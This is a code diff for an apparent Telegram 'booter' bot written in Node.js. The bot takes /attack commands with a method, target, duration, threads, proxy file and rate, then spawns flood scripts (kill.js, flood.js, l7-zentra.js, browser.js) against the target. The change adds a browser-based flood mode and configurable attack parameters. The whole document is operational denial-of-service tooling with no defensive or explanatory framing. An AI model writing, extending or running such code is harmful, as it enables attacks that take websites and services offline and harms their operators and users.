@@ -89,7 +89,7 @@ bot.onText(/\/methods/, async (msg) => {
 
   if (!isAdmin && !isGroupActive) return
 
-  bot.sendMessage(chatId, 'Available methods: kill, flood, zentra, http')
+  bot.sendMessage(chatId, 'Available methods: kill, flood, zentra, browser')
 })
 
 bot.onText(/\/bot\s+(on|off)/, async (msg, match) => {
@@ -126,19 +126,20 @@ bot.on('message', async (msg) => {
 
   if (text.startsWith('/attack')) {
     const args = text.split(/\s+/).slice(1)
-    if (args.length !== 3) {
-      bot.sendMessage(id, 'Usage: /attack [method] [target] [time]')
+    const [method, target, timeStr, threadsStr, proxyFile, rateStr, floodModeStr] = args
+    const time = parseInt(timeStr) || 60
+    const threads = parseInt(threadsStr) || 15
+    const proxy = proxyFile || './prx.txt'
+    const rate = parseInt(rateStr) || 20
+    const floodMode = floodModeStr !== 'false'
+
+    if (args.length < 2 || (method === 'browser' && args.length < 3)) {
+      bot.sendMessage(id, 'Usage: /attack [method] [target] [time] [threads] [proxyfile] [rate] [flood_mode]')
       return
     }
 
-    const [method, target, timeStr] = args
-    const time = parseInt(timeStr)
-    const rate = 20
-    const thread = 15
-    const proxy = './prx.txt'
-
-    if (!['kill', 'flood', 'zentra', 'http'].includes(method)) {
-      bot.sendMessage(id, 'Method must be "kill", "flood", "zentra", or "http".')
+    if (!['kill', 'flood', 'zentra', 'browser'].includes(method)) {
+      bot.sendMessage(id, 'Method must be "kill", "flood", "zentra", or "browser".')
       return
     }
 
@@ -163,11 +164,11 @@ bot.on('message', async (msg) => {
       return
     }
 
-    const scriptFile = method === 'kill' ? './kill.js' : method === 'flood' ? './flood.js' : method === 'zentra' ? './l7-zentra.js' : './http.js'
-    const cmdArgs = method === 'http' ? [scriptFile, target, time, proxy] : [scriptFile, target, time, rate, thread, proxy]
+    const scriptFile = method === 'kill' ? './kill.js' : method === 'flood' ? './flood.js' : method === 'zentra' ? './l7-zentra.js' : './browser.js'
+    const cmdArgs = method === 'browser' ? [scriptFile, target, String(threads), proxy, String(rate), String(floodMode)] : [scriptFile, target, time, rate, threads, proxy]
     const cmd = spawn('node', cmdArgs, { stdio: ['ignore', 'pipe', 'pipe'] })
     const attackId = `${userId}_${Date.now()}`
-    activeAttacks[attackId] = { cmd, target, time, rate, thread, proxy, userId, remainingTime: time, messageId: null, startTime: Date.now(), method }
+    activeAttacks[attackId] = { cmd, target, time, rate, threads, proxy, userId, remainingTime: time, messageId: null, startTime: Date.now(), method, floodMode: method === 'browser' ? floodMode : undefined }
 
     const response = {
       status: 'Attack Started',
@@ -175,8 +176,9 @@ bot.on('message', async (msg) => {
       target,
       time,
       rate,
-      thread,
+      threads,
       proxy,
+      floodMode: method === 'browser' ? floodMode : undefined,
       caller: username,
       index: attackId
     }
@@ -214,8 +216,9 @@ bot.on('message', async (msg) => {
         target,
         time: activeAttacks[attackId].remainingTime,
         rate,
-        thread,
+        threads,
         proxy,
+        floodMode: method === 'browser' ? floodMode : undefined,
         caller: username,
         index: attackId
       }
@@ -274,8 +277,9 @@ bot.on('message', async (msg) => {
         target: v.target,
         time: v.remainingTime,
         rate: v.rate,
-        thread: v.thread,
-        proxy: v.proxy
+        threads: v.threads,
+        proxy: v.proxy,
+        floodMode: v.floodMode
       }))
     bot.sendMessage(id, '```json\n' + JSON.stringify(list, null, 2) + '\n```', { parse_mode: 'Markdown' })
   }
